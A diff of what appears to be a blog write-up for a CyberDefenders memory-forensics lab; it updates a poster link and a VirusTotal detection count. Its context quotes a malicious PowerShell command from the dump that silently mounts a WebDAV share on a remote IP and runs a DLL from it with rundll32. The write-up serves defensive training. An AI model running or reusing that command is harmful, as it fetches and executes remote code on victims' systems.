@@ -39,7 +39,7 @@ Question 1: Identifying the name of the malicious process helps in understanding
 
 What am I looking for?
 
-I am searching for a suspicious process that appears normal in the memory dump, so I first need to understand what a typical process looks like. The first page of this [SANS Threat Hunting Poster](/assets/documents/SANS_LINUX_Incident_Response_Threat_Hunting_Poster.pdf) lists common processes and the number of instances usually found in any Windows memory dump.
+I am searching for a suspicious process that appears normal in the memory dump, so I first need to understand what a typical process looks like. The first page of this [SANS Threat Hunting Poster](/assets/documents/SANS_DFPS_FOR508.pdf) lists common processes and the number of instances usually found in any Windows memory dump.
 
 Where will I find the attack evidence?
 
@@ -186,7 +186,7 @@ How can I manipulate the data to see it?
 Returning to the suspicious PowerShell command : powershell.exe -windowstyle hidden net use \\45.9.74.32@8888\davwwwroot\ ; rundll32 \\45.9.74.32@8888\davwwwroot\3435.dll,entry
 - This command suggests the use of a remote IP address (45.9.74.32) to download a potentially malicious payload as we discussed before.
 
-To gather more information, I will submit the IP address (45.9.74.32) to a threat intelligence platform such as VirusTotal. Upon submission, it is revealed that this IP is flagged by 14 out of 94 security vendors and sandbox environments, indicating its association with malicious activity.
+To gather more information, I will submit the IP address (45.9.74.32) to a threat intelligence platform such as VirusTotal. Upon submission, it is revealed that this IP is flagged by 14 out of 95 security vendors and sandbox environments, indicating its association with malicious activity.
 
 ![Image](/assets/img/cyberdefenders/reveal-lab/question7.0.png)
 
